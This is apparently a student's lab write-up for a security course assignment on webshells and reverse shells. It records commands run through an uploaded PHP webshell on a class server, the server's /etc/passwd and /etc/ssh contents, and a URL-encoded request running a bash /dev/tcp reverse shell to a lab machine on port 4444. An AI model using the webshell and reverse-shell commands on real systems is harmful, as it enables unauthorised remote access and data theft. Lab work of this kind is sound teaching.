# Assignment 6 - Our First Reverse Shell - Noah Lee - 30th October 2024

## PART 1

a. 
This link in the browser
http://danger.jeffondich.com/uploadedimages/leen2-webshell7.php?command=whoami

b.
The pre tag is for accurately representing the shell command's output on the screen. If we forget the pre tag, the other html tags would be shown in the output along with what we actually want to see.

## PART 2

a. /var/www/danger.jeffondich.com/uploadedimages
b. http://danger.jeffondich.com/uploadedimages/leen2-webshell7.php?command=ls%20|%20grep%20%27-%27%20|%20cut%20-d%27-%27%20-f1%20|%20sort%20|%20uniq: 
akyianun
anyaegbunamu
commonsj
daviso
dawsonj2
ederingtons
euaanantp
gautamaj
guzmannunezj
jeremiah
jondich
jwin
klangsathornp
kleinhansc
leen2
lehra
lkeane
moranl2
mshiffman
muhozal
reverse
reyesm
sonr
thomastothe
toledod
tourea
winhallk
yangb2
yuc3


c. 
-rw-r--r-- 1 root     root       1936 Oct 24 21:43 passwd
I can read it, it looks like a list of user accounts with the username, password and other fields in each record.

d.-rw-r----- 1 root     shadow     1242 Oct 24 21:43 shadow - i can not look into it.
shadow contains secure user authenticated information like hashed passwords and usernames. - like the account information for Bob, Alice and Moriarty.

e.
I found a /etc/ssh directory where I found private keys I could not read but also some readable public keys.
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2hPfk73CNlo6mNBkWfdyhcqi2FaYihtDqk6CMuioQHoLFGNjhVcZAyuBkTNWlc+Rj1o0/QCSCjfCWD0s3dmp/7nRbFLOd+VT9Ue0RumV6y4GpGcImV2wonA2Tt8dFj85eYVW9Q2HG4gRdpqX9kZnPMQfMkGeI9tSJDawwxOPpCxcRHAutMAweH1pBe4Zw0jQWMcq06czUG4e6srRRykPT/UFxM8yrAjpSJzWxjXmmv3FQQREoIRiV6qLxPvNDTvJQ0j26z6RpwOfrpbJvCSSz10ikkNVpJm4cGjPkDas7wMdAZzMB7n4vkfziJpaUCSU/DyQWGj+i2nV9eY89vfvazEcjMlP/vH2+cGR881OenVLEokTRp8wUldjKySln/VT/wHLkoXTB/dtjrC3bqbKgXNgUU0MIhjXbb5KVsqhmAXWURVEn3j23/pFX33/OM3tgBxiBet3awFuEdrQWSBmDuK5lcvaIszMumvdHDDFHXFJ3DLZG9Qo0p7tEUYDdHm8= root@localhost

f.
It is interesting how many readable files and directories there were. There were many documents that I think even the developer has not read, so with this shell, it is possible that a hacker may have greater knowledge of the system than the developer themselves.

## PART 4
a. 192.168.XX.2 - using ifconfig
b. 192.168.XX.1 - using ifconfig
c. 4444
d.
http://192.168.64.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/4444%200%3E%261%22
e. It is working. I can tell because when I run whoami it says 'Kali'
f.Likely characters encoded in base64
g. \
1. Attacker sets up NC connection and waits for incoming connections 
2. The attacker uses the webshell on the Kali VM to execute a command that initiates a reverse shell back to the attacker.
3. The Kali VM initiates a TCP connection from /dev/tcp/... back to the attackers machine.
4. The attacker now has a reverse shell for the kali machine (target) and the outputs of commands like 'whoami' are sent over tcp.


